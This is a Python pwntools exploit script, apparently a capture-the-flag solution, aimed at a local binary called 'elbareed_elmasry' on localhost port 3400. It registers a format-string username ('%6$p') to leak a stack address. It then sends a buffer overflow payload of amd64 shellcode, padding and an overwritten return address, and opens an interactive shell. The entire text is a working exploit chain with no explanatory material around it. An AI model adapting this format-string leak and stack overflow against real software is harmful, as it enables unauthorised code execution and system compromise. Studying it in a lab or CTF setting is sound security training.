

from pwn import *


context.log_level = 'debug'
context.arch = 'amd64'
BINARY = "./src/elbareed_elmasry"

if args.LOCAL:
    r = process(BINARY)
else:
    #r = process(BINARY)
    r = remote("localhost", 3400)

e = ELF(BINARY)
shell_code = asm(shellcraft.amd64.sh())

# ret = ROP(e).find_gadget(['ret'])[0]  

gdb_script = """
b *send_letter+75
"""

def register():
    print("[*] Registering...")
    r.sendline("1")
    print("[*] Sending username...")
    print(r.recv().decode())
    r.sendline("%6$p")
    # print(r.recv().decode())

def login():
    print("[*] Logging in...")
    r.sendline("2")
    r.recvuntil(b"Enter username to login:")
    r.sendline("%6$p")
    # print(r.recv().decode())

def get_leak():
    print("[*] Getting leak...")
    r.sendline("3")
    profile = r.recv()
    print("Profile: ",profile)
    stack_leak = int(profile.decode().split("Username: ")[1].split("\n")[0], 16)
    shell_code_address = stack_leak - 0x120
    return shell_code_address



try:
    # gdb.attach(r,gdb_script)
    output = r.recvuntil(b"Exit\n>")
    print(output.decode())
    register()
    print(r.recv().decode())
    login()
    print(r.recv().decode())
    leaked_address = get_leak()
    r.sendline("4")
    print(r.recv().decode())

    payload = flat(shell_code, 'A' * (256 - len(shell_code)), 'B'*8, p64(leaked_address))
    r.sendline(payload)
    r.interactive()

except Exception as e:
    print(f"[-] Error: {str(e)}")

finally:
    r.close()